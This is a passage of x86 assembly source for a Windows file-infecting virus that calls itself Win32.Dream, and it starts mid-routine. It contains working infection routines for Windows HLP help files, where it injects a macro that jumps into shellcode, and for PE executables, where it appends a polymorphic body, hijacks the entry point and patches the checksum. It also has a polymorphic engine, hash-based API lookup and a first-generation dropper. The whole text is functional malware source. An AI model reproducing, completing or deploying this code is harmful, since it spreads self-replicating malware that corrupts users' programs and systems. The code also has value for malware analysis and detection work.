	cmp	dword ptr [ebx+paramz+(5-1)*4],1
	jnz	$ + 12
	sub	eax,-(dword-ci_size/2)
	fld	st(0)
	fstp	tbyte ptr [esi+eax]
	fld	tbyte ptr [esi+eax]
	fsub
	sub	esp,tbyte
	fstp	tbyte ptr [esp]
	cmp	dword ptr [esp+tbyte-dword],0	;compare the results
	lahf
	sub	esp,-tbyte
	wait
	fnrstor [esp]
	sub	esp,-128
	sahf
	jnz	ci_failed
	push	1
	pop	eax
	mov	[ebx+paramz+(4-1)*4],eax
	jmp	ci_finish
   ci_failed:
	xor	eax,eax
	mov	[ebx+paramz+(4-1)*4],eax
   ci_finish:
	cmp	[ebx+paramz+(5-1)*4],1
	jz	$ + 8
	call	[ebx+apiz+8*4]			;UnMapViewOfFile
	call	[ebx+apiz+1*4]			;CloseHandle
	end_thread check_infected
check_infected endp

	dw	infect_hlp-create_infected
create_infected proc
	start_thread create_infected
	lea	edi,[esi+vbody+vsize+260]
	push	edi
	stosd
	call	$ + 241 			;number of the terms in a
	shr	eax,29				;equation
	xchg	eax,ecx
	inc	ecx
	push	ecx
	sub	esp,128
	fnsave	[esp]
	call	$ + 221 			;generate a multiplier (+/-)
	sub	edx,edx
	mov	ebx,100000
	div	ebx
	or	edx,edx
	jz	$ - 16
	fld1
	rcr	eax,1
	jc	$ + 4
	fchs
	push	edx
	fimul	dword ptr [esp]
	fstp	tbyte ptr [edi]
	pop	edx
	sub	edi,-tbyte
	call	$ + 119 			;generate an exponent
	loop	$ - 41				;next term in the equation
	inc	ecx
	inc	ecx
	call	$ + 110 			;two points on the curve
	loop	$ - 5
	fnrstor [esp]
	sub	esp,-128
	pop	eax
	stosd
	lea	ecx,[edi+tbyte]
	sub	edi,[esp]
	xchg	eax,edi
	pop	edi
	stosd
	pusha					;calculate an angle, it
	mov	ebx,esi 			;means: call other process
	mov	[esi+paramz+(4-1)*4],ecx
	mov	[esi+paramz+(5-1)*4],1
	lea	edi,[esi+active+1]
	lea	esi,[esi+process+1*8]
	lodsd
	push	eax
	lodsd
	mov	byte ptr [edi],1
	push	eax 0 1F0FFFh
	call	[ebx+apiz+4*12] 		;OpenProcess
	pop	esi
	push	40 esi
	call	[ebx+apiz+4*13] 		;WaitForSingleObject
	cmp	byte ptr [edi],0
	jnz	$ - 9
	popa
	mov	[esi+paramz+(5-1)*4],0
	end_thread create_infected
	call	$ + 66				;generate an exponent
	sub	edx,edx
	push	11
	pop	ebx
	div	ebx
	or	edx,edx
	jz	$-14
	push	edx
	fild	dword ptr [esp]
	call	$+15
	dt 3FEB8637BD05AF6C69B6r
	pop	eax ebx
	fld	tbyte ptr [eax]
	xchg	ebx,eax
	cdq
	call	$ + 25
	mov	ebx,1000000
	div	ebx
	push	edx
	fimul	dword ptr [esp]
	fsub
	fstp	tbyte ptr [edi]
	pop	eax
	sub	edi,-tbyte
	ret
	mov	eax,0				;get a random value
   lpGetTickCount equ $-4
	call	eax
	add	eax,80h
	push	ecx 33
	pop	ecx
	add	eax,eax
	jnc	$ + 4
	xor	al,197
	loop	$ - 6
	mov	[ebp+($-16)-create_infected],eax
	pop	ecx
	ret
create_infected endp

	dw	infect_exe-infect_hlp
infect_hlp proc
	start_thread infect_hlp
	sub	esp,16
	sub	ebx,ebx
	mov	word ptr [esi+vbody+__return+11-vstart],02EBh
	lea	eax,[esi+vbody+vsize]
	push	ebx 80h 3 ebx ebx 0c0000000h eax
	call	[esi+apiz+4*0]			;open file
	inc	eax
	jz	ih_failed
	dec	eax
	push	eax
	mov	bh,80h
	push	ebx 40h
	mov	eax,0
   lpGlobalAlloc equ $-4
	call	eax				;GlobalAlloc
	mov	[esp+4],eax
	xchg	eax,esi
	push	16
	pop	ecx
	sub	edx,edx
	call	read
	jc	ih_free
	lodsd
	cmp	eax,35f3fh			;hlp signature
	jnz	ih_free
	lodsd
	lea	edx,[eax+55]			;directory offset
	mov	ecx,512
	lodsd
	lodsd
	call	read
   ih_search:
	dec	ecx
	jz	ih_free
	cmp	dword ptr [esi+ecx],'SYS|'
	jnz	ih_search
	cmp	dword ptr [esi+ecx+4],'MET'
	jnz	ih_search
	mov	eax,[esi-4]
	xchg	eax,[esi+ecx+8]
	xchg	eax,edx
	push	21
	sub	esi,-512
	pop	ecx
	call	read
	lodsd
	push	21
	pop	ecx
	sub	eax,ecx
	add	edx,ecx
	mov	[esp+4+4],edx
	mov	[esp+8+4],eax
	mov	edi,[esp+4]
	sub	edi,-549
	lea	esi,[ebp+hlp1_s-infect_hlp]
	lea	eax,[edi+size-hlp1_s]
	mov	[esp+12+4],eax
	push	hlp1_e-hlp1_s
	pop	ecx
	rep	movsb
	push	edi
	mov	ebx,[esp+40+16+8+4]
	lea	esi,[ebx+vbody]
	push	esi
	sub	esi,-vsize
   ih_next:
	sub	esi,4
	mov	eax,[esi]
	call	ihck
	or	edx,edx
	jnz	ihex
	mov	al,68h
	stosb
	mov	eax,[esi]
	stosd
	jmp	ihdn
   ihex:mov	al,0b8h
	stosb
	mov	eax,[esi]
	xor	eax,edx
	stosd
	mov	al,53
	stosb
	mov	eax,edx
	stosd
	mov	al,80
	stosb
   ihdn:cmp	[esp],esi
	jnz	ih_next
	jmp	ihcn
   ihck:call	ihcv
	jc	iha1
	sub	edx,edx
	ret
   iha1:mov	ebx,eax
   ihax:mov	eax,ebx
	call	$+9
	dd	12345678h
	pop	edx
	sub	[edx],12345678h
	org	$-4
	rnd	dd 87654321h
	mov	edx,[edx]
	xor	[ebp+rnd-infect_hlp],edx
	xor	eax,edx
	call	ihcv
	jc	ihax
	xchg	eax,edx
	call	ihcv
	jc	ihax
	xchg	edx,eax
	ret
   ihcv:pusha
	push	4
	pop	ecx
   icva:cmp	al,' '
	jna	icvf
	cmp	al,0f0h
	jnbe	icvf
	cmp	al,'"'
	jz	icvf
	cmp	al,"'"
	jz	icvf
	cmp	al,"`"
	jz	icvf
	cmp	al,"\"
	jz	icvf
	ror	eax,8
	loop	icva
	test	al,0F9h
   icvf equ $-1
	popa
	ret
   ihcn:pop	eax eax
	mov	ecx,edi
	sub	ecx,eax
	sub	eax,eax
	mov	[esi+org_ep-vstart],eax
	push	ecx
	sub	ecx, p1-hlp1_e+hlp1_e-hlp2_e
	mov	eax,[esp+12+4+4]
	mov	[eax],cx
	sub	esi,vstart-hlp1_e
	push	hlp2_sz
	pop	ecx
	rep	movsb
	pop	eax
	mov	esi,[esp+4]			;buffer
	sub	esi,-528
	sub	eax,hlp1_s-hlp2_e-21
	mov	[esi],eax
	add	[esi+4],eax
	mov	esi,edi
	mov	edx,[esp+4+4]
	mov	ecx,[esp+8+4]
	sub	eax,ecx
	jna	ih_free
	call	read
	cmp	[esi+4],"`(RR"			;already infected?
	jz	ih_free
	mov	ebx,[esp+4]
	lea	ecx,[edi+eax]
	sub	ecx,ebx
	sub	ecx,528
	mov	eax,[esp+4]
	sub	eax,-528
	mov	edx,[eax]
	sub	edx,ecx
	sub	[eax],edx
	mov	edx,[ebx+12]
	lea	esi,[ebx+528]
	call	write
	mov	esi,[esp+4]
	push	16
	add	[esi+12],ecx
	sub	edx,edx
	pop	ecx
	call	write
	mov	edx,[esi+4]
	sub	edx,-55
	mov	ecx,512
	sub	esi,-16
	call	write
	jmp	ih_free

   spos:pusha
	sub	eax,eax
	push	eax eax edx dword ptr [esp+4*5+8*4]
	mov	eax,0
   lpSetFilePointer equ $-4
	call	eax
	popa
	ret
   read:call	spos
	pusha
	sub	eax,eax
	push	ecx eax
	call	$+9
   r_ts:dd	?
	push	ecx esi dword ptr [esp+4*6+8*4]
	mov	eax,0
   lpReadFile equ $-4
	call	eax
	pop	ecx
	cmp	dword ptr [ebp+r_ts-infect_hlp],ecx
	jnz	$+3
	test	al,0F9h
	popa
	ret
  write:call	spos
	pusha
	sub	eax,eax
	push	eax
	lea	ebx,[ebp+r_ts-infect_hlp]
	push	ebx ecx esi dword ptr [esp+4*5+8*4]
	mov	eax,[esp+4*5+8*4+4+16+8+40]	;ou! what does it mean :) ?
	call	[eax+apiz+4*10]
	popa
	ret

   hlp1_s=$
	dw 4
	dw offset label1-$-2
	db "RR(`USER32.DLL',`EnumWindows',`SU')",0
   label1=$
	dw 4
   size dw 0
   p1	= $
	db "EnumWindows(`"
   hlp1_e= $
       jmp esp
       db "',0)",0
   hlp2_e = $
   hlp2_sz=hlp2_e-hlp1_e

   ih_free:
	mov	esi,[esp+40+16+4+4]
	call	[esi+apiz+4*1]			;CloseHandle
	mov	eax,0
   lpGlobalFree equ $-4
	call	eax
   ih_failed:
	sub	esp,-12
	end_thread infect_hlp
infect_hlp endp

	dw	poly_engine-infect_exe
infect_exe proc
	start_thread infect_exe
	sub	ebx,ebx
	lea	eax,[esi+vbody+vsize]
	push	ebx 80h 3 ebx ebx 0c0000000h eax
	call	[esi+apiz+4*0]			;CreateFileA
	inc	eax
	jz	ie_failed
	dec	eax
	push	eax ebx eax
	mov	eax,0
   lpGetFileSize equ $-4
	call	eax
	cmp	eax,4096
	jc	ie_close
	cmp	eax,104857600
	jnbe	ie_close
	mov	[ebp+fsize-infect_exe],eax
	call	$ + 7
	db	"1",0
	push	ebx ebx 2 ebx dword ptr [esp+4*5]
	call	[esi+apiz+4*6]			;CreateFileMappingA
	or	eax,eax
	jz	ie_close
	push	eax ebx ebx ebx 4 eax
	call	[esi+apiz+28]			;MapViewOfFile
	or	eax,eax
	jz	ie_mclose
	push	eax
	cmp	word ptr [eax],'ZM'
	jnz	ie_unmap
	cmp	word ptr [eax+MZ_crlc],bx
	jz	ie_tested
	cmp	word ptr [eax+MZ_lfarlc],64
	jc	ie_unmap
   ie_tested:
	mov	edi,[eax+MZ_lfanew]
	add	edi,eax
	cmp	dword ptr [edi],4550h
	jnz	ie_unmap
	mov	eax,[esp+4]
	mov	[esi+paramz+(3-1)*4],eax
	mov	eax,[ebp+fsize-infect_exe]
	mov	[esi+paramz+(4-1)*4],eax

	call	other_process, 1	    ;active check_infected process

	cmp	[esi+paramz+(4-1)*4],1
	jz	ie_unmap

	call	other_process, 2	    ;active create_infected process

	mov	ax,[edi+NT_FileHeader.FH_Characteristics]
	test	ax,IMAGE_FILE_EXECUTABLE_IMAGE
	jz	ie_unmap
	test	ax,IMAGE_FILE_DLL
	jnz	ie_unmap
	movzx	ecx,[edi+NT_FileHeader.FH_NumberOfSections]
	dec	ecx
	or	ecx,ecx
	jz	ie_unmap
	imul	eax,ecx,IMAGE_SIZEOF_SECTION_HEADER
	movzx	edx,[edi+NT_FileHeader.FH_SizeOfOptionalHeader]
	mov	[ebp+ie_section-infect_exe],eax
	lea	ebx,[edx+edi+NT_OptionalHeader.OH_Magic]
	add	ebx,eax
	mov	eax,[ebx+SH_SizeOfRawData]
	push	eax
	add	eax,[ebx+SH_VirtualAddress]
	lea	ecx,[esi+vbody+inf_ep-vstart]
	mov	[ecx],eax
	mov	eax,[edi+NT_OptionalHeader.OH_AddressOfEntryPoint]
	mov	[ecx+5+6],eax

	call	other_process, 5		;active poly_engine process

	pop	eax
	add	eax,[ebx+SH_PointerToRawData]
	add	eax,[esi+paramz+4*0]
	add	eax,dword ptr [esi+vbody+vsize+260]
	mov	ecx,[edi+NT_OptionalHeader.OH_FileAlignment]
	add	eax,ecx
	cdq
	dec	eax
	div	ecx
	mul	ecx
	mov	[ebp+align_d-infect_exe],eax
	call	[esi+apiz+4*8]			;UnMapViewOfFile
	call	[esi+apiz+4*1]			;CloseHandle
	sub	ebx,ebx
	call	$ + 7
	db	"1",0
    align_d equ $+1
	push	80h ebx 4 ebx dword ptr [esp+4*5]
	call	[esi+apiz+4*6]			;CreateFileMappingA
	push	eax ebx ebx ebx 2 eax
	call	[esi+apiz+4*7]			;thx2 Bumblebee for his help
	push	eax
	add	eax,[eax.MZ_lfanew]
	xchg	eax,edi
	mov	ebx,0
    ie_section equ $-4
	movzx	edx,[edi+NT_FileHeader.FH_SizeOfOptionalHeader]
	lea	eax,[edx+edi+NT_OptionalHeader.OH_Magic]
	movzx	ecx,[edi+NT_FileHeader.FH_NumberOfSections]
	add	eax,ebx
    ie_change_flag:
	or	[eax.SH_Characteristics],IMAGE_SCN_MEM_WRITE
	sub	eax,IMAGE_SIZEOF_SECTION_HEADER
	loop	ie_change_flag
	lea	eax,[edx+edi+NT_OptionalHeader.OH_Magic]
	add	ebx,eax
	mov	eax,[esi+vbody+inf_ep-vstart]
	mov	[edi+NT_OptionalHeader.OH_AddressOfEntryPoint],eax
	pusha
	mov	ecx,[esi+paramz+4*0]
	mov	[esp+7*4],ecx
	mov	edi,[ebx+SH_SizeOfRawData]
	add	[esp+7*4],edi
	add	edi,[ebx+SH_PointerToRawData]
	add	edi,[esp+7*4+4]
	lea	esi,[esi+vbody+vsize+260+ci_size]	;poly vbody
	rep	movsb
	popa
	mov	eax,[esi+paramz+4*0]
	add	eax,[ebx+SH_SizeOfRawData]
	mov	ecx,[edi+NT_OptionalHeader.OH_FileAlignment]
	add	eax,ecx
	cdq
	dec	eax
	div	ecx
	mul	ecx
	mov	[ebx+SH_SizeOfRawData],eax
	push	eax
	mov	eax,[ebx+SH_VirtualSize]
	add	eax,vsize+68
	mov	ecx,[edi+NT_OptionalHeader.OH_SectionAlignment]
	add	eax,ecx
	cdq
	dec	eax
	div	ecx
	mul	ecx
	pop	ecx
	cmp	eax,ecx
	jnc	ie_1
	mov	eax,ecx
   ie_1:mov	[ebx+SH_VirtualSize],eax
	add	eax,[ebx+SH_VirtualAddress]
	cmp	eax,[edi+NT_OptionalHeader.OH_SizeOfImage]
	jc	ie_2
	mov	[edi+NT_OptionalHeader.OH_SizeOfImage],eax
   ie_2:or	dword ptr [ebx+SH_Characteristics], \
		   IMAGE_SCN_CNT_CODE or IMAGE_SCN_MEM_EXECUTE or \
		   IMAGE_SCN_MEM_WRITE
	.if dword ptr [edi+NT_OptionalHeader.OH_CheckSum] != 0
	mov	eax,0
   fsize equ $-4
	add	eax,[esi+paramz+(1-1)*4]
	mov	[esi+paramz+(2-1)*4],eax

	call	other_process, 6		;active checksum process

	mov	eax,[esi+paramz+(4-1)*4]
	mov	[edi+NT_OptionalHeader.OH_CheckSum],eax
	.endif

	push	esi
	mov	edi,[ebp+align_d-infect_exe]
	add	edi,[esp+4]
	lea	esi,[esi+vbody+vsize+260]
	lodsd
	sub	eax,4-tbyte
	sub	edi,eax
	xchg	eax,ecx
	rep	movsb
	pop	esi
   ie_unmap:
	call	[esi+apiz+4*8]			;UnMapViewOfFile
   ie_mclose:
	call	[esi+apiz+4*1]			;CloseHandle
   ie_close:
	call	[esi+apiz+4*1]			;CloseHandle
   ie_failed:
	end_thread infect_exe

   other_process proc
	pusha
	mov	ecx,[esp+36]
	mov	ebx,esi
	lea	edi,[esi+active+ecx]
	lea	esi,[esi+process+ecx*8]
	lodsd
	push	eax
	lodsd
	mov	byte ptr [edi],1
	push	eax 0 1F0FFFh
	call	[ebx+apiz+4*12] 		;OpenProcess
	pop	esi
	push	40 esi
	call	[ebx+apiz+4*13] 		;WaitForSingleObject
	cmp	byte ptr [edi],0
	jnz	$ - 9
	popa
	ret	4
   other_process endp

infect_exe endp

	dw	checksum-poly_engine
poly_engine proc
	start_thread poly_engine
	mov	ebx,esi
	lea	esi,[ebx+vbody+vsize]
	lea	edi,[esi+260+ci_size]
	push	ebx edi
	sub	ecx,ecx
	mov	edx,vsize / 2

	mov	eax,0E8h
	stosd
	mov	eax,242C8300h
	stosd
	mov	al,5
	stosb
    @@a:call	random
	test	al,1
	jnz	@@b
	cmp	edx,1
	jz	@@v
	sub	esi,4
	push	esi
	lodsd
	call	@@1_a
	pop	esi
	dec	edx
	jmp	@@k
    @@b:test	al,2
	jnz	@@c
    @@v:dec	esi
	dec	esi
	push	esi
	lodsw
	inc	ecx
	call	@@1_a
	pop	esi
	sub	cl,cl
	jmp	@@k
    @@c:test	al,4
	jnz	@@e
	call	@@1				;push random value DWORD
	jc	$+7
	call	@@2
	jmp	@@l
    @@e:inc	ecx				;push random value WORD
	call	@@1
	jc	$+7
	call	@@2
	sub	cl,cl
	jmp	$+5
    @@k:dec	edx
	jz	$+4
    @@l:jmp	@@a
	mov	ax,0E4FFh
	stosw
	jmp	pe_failed

    @@1:call	random				;push random value
	test	al,1
	jnz	@@1_d
  @@1_a:xchg	eax,ebx 			;push certain value
  @@1_b:jecxz	@@1_c				;push WORD
	mov	al,66h
	stosb
  @@1_c:call	@@3_a
	test	al,0F9h
  @@1_d equ $-1
	ret
    @@2:call	random				;POP reg32 or ADD ESP,4
	test	al,1
	jnz	@@2_b
	and	al,7
	cmp	al,4
	jz	@@2
	or	al,al
	jz	@@2
	jecxz	@@2_a
	xchg	eax,ebx
	mov	al,66h
	stosb
	xchg	ebx,eax
  @@2_a:add	al,58h
	stosb
	ret
  @@2_b:mov	ax,0C483h
	stosw
	mov	al,4
	jecxz	@@2_c
	mov	al,2
  @@2_c:stosb
	ret
    @@3:xchg	eax,ebx 			;push certain value in EAX
  @@3_a:mov	al,68h				;		    in EBX
	stosb
	xchg	eax,ebx
	jecxz	@@3_b
	stosw
	ret
  @@3_b:stosd
	ret

  random:
	mov	eax,0BFF71234h
	push	ecx 33
	pop	ecx
    @@r:add	eax,eax
	jnc	$+4
	xor	al,197
	loop	@@r
	mov	[ebp+random+1-poly_engine],eax
	pop	ecx
	ret

   pe_failed:
	pop	ecx ebx
	sub	edi,ecx
	mov	[ebx+paramz+4*0],edi
	end_thread poly_engine
poly_engine endp

	dw	k32_addrs-checksum
checksum proc
	start_thread checksum
	xchg	ebx,esi

	other_process_mem ebx 3 		;get mem from other process

	mov	ecx,[ebx+paramz+(2-1)*4]
	sub	edx,edx
	shr	ecx,1
    @@1:lodsw
	mov	edi,0FFFFh
	and	eax,edi
	add	edx,eax
	mov	eax,edx
	and	edx,edi
	shr	eax,10h
	add	edx,eax
	loop	@@1
	mov	eax,edx
	shr	eax,10h
	add	ax,dx
	add	eax,[ebp+4]
	mov	[ebx+paramz+(4-1)*4],eax
	call	[ebx+apiz+8*4]			;UnMapViewOfFile
	call	[ebx+apiz+1*4]			;CloseHandle
	end_thread checksum
checksum endp

k32_addrs equ this byte
	   x equ <vstart->
	dw x lpCreateFile
	dw x lpCloseHandle
	dw x lpCreateMutexA
	dw x lpGetLastError
	dw x lpReleaseMutex
	dw x lpExitProcess
	dw x lpCreateFileMappingA
	dw x lpMapViewOfFile
	dw x lpUnMapViewOfFile
	dw x lpGetSystemDirectory
	dw x lpWriteFile
	dw x lpCreateProcessA
	dw x lpOpenProcess
	dw x lpWaitForSingleObject
	dw x lpRegisterServiceProcess
	dw x lpGetFileSize
	dw x lpGlobalAlloc
	dw x lpGlobalFree
	dw x lpReadFile
	dw x lpSetFilePointer
	dw x lpSetErrorMode
	dw x lpGetCurrentProcessId
	dw x lpGetVersion
	dw x lpGetTickCount
	dw x malloc+63
	dw x malloc+51
	dw x malloc+106
	dw x infect_file-2
count equ ($-k32_addrs)/2

k32_crcs equ this byte
	dd 08C892DDFh	;CreateFileA
	dd 068624A9Dh	;CloseHandle
	dd 020B943E7h	;CreateMutexA
	dd 087D52C94h	;GetLastError
	dd 0C449CF4Eh	;ReleaseMutexA
	dd 040F57181h	;ExitProcess
	dd 096B2D96Ch	;CreateFileMappingA
	dd 0797B49ECh	;MapViewOfFile
	dd 094524B42h	;UnMapViewOfFile
	dd 0593AE7CEh	;GetSystemDirectoryA
	dd 021777793h	;WriteFile
	dd 0267E0B05h	;CreateProcessA
	dd 033D350C4h	;OpenProcess
	dd 0D4540229h	;WaitForSingleObject
	dd 05F31BC8Eh	;RegisterServiceProcess
	dd 0EF7D811Bh	;GetFileSize
	dd 083A353C3h	;GlobalAlloc
	dd 05CDF6B6Ah	;GlobalFree
	dd 054D8615Ah	;ReadFile
	dd 085859D42h	;SetFilePointer
	dd 0A2EB817Bh	;SetErrorMode
	dd 0EB1CE85Ch	;GetCurrentProcessId
	dd 042F13D06h	;GetVersion
	dd 0613FD7BAh	;GetTickCount
	dd 041D64912h	;OpenFileMappingA
	dd 0797B49ECh	;MapViewOfFile (other address)
	dd 019F33607h	;CreateThread
	dd 00AC136BAh	;Sleep
	dd 0

process_maps equ this byte
	dw x infect_file
	dw x check_infected
	dw x create_infected
	dw x infect_hlp
	dw x infect_exe
	dw x poly_engine
	dw x checksum
p_number equ ($-process_maps)/2
	dw x malloc+95

process_memory struc
	thandle    dd  0		  ;returned thread handle by dropper
	th_mempos  dd  0		  ;thread body memory position
	process    dd  p_number dup (0,0) ;hProcess (Wait), ProcessID (Open)
	apiz	   dd  count-2 dup (0)	  ;all API functionz without two last
	active	   db  p_number dup (0)   ;active process (=function) ?
	paramz	   dd  8 dup (0)	  ;process parameters
	vbody	   db  vsize dup (0)	  ;virus body (poly, valuez)
;	filename   dd  260 dup (0)	  ;name of file (opening, etc)
	ci_size    equ 2*16*(tbyte+tbyte) ;check_infected fpu buffer
;	cinfected  db  ci_size dup(0)
;	poly_vbody equ this byte
; ** This is Tasm32 bug, cannot asm through const->proc + dup
ends

	align 4
file_end:
	db 68 dup(0)

mem_end:
	push	401000h
	sub	esp,vsize
	jmp	vstart
    fgx:db	"E:\X_WIN\ABCD.EXE",0
    fg0:mov	edx,offset fgx
	sub	eax,eax
	push	eax 80h 3 eax eax 0c0000000h edx
	call	CreateFileA

	push	0 0
	call	fg1
	db	"Win32.Dream - welcome to my world...",0
    fg1:call	fg2
	db	"First generation sample",0
    fg2:push	0
	call	MessageBoxA
	call	ExitProcess

;ÄÄÄ´ end of virus ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
end mem_end
